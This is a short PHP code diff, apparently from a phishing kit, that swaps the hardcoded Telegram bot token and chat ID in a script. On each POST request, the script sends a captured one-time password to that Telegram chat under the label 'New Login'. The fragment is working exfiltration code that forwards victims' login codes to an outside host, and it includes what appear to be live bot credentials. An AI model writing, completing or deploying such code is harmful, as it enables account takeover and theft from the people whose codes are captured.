@@ -5,8 +5,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
 
     // Send data to Telegram
-    $telegramBotToken = '6978848955:AAFZ-QvMhqwB2cfDoX6S-B9AfpWsss4XGlM';
-    $chatId = '6311691587';
+    $telegramBotToken = '6521884473:AAEd3XCqFN_d5DXW8VOrGcgx8hHFwQJZCno';
+    $chatId = '5508958154';
     $message = "New Login\notp: $otp";
 
     $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
